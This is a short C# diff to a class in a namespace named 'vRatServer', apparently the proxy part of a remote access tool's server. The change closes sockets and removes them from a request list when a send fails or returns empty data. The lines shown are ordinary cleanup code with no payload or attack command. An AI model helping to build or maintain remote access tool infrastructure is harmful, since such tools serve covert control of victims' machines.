@@ -19,11 +19,12 @@ namespace vRatServer.Classes
                     {
                         sd.s.Send(data);
                     }
-                    catch (Exception e) { break; }
+                    catch (Exception e) {sd.s.Close();ProxyServer.req.Remove(sd); break; }
 
                     if (data.Length == 0)
                     {
                         sd.s.Close();
+                        ProxyServer.req.Remove(sd);
                         
                     }
                     break;
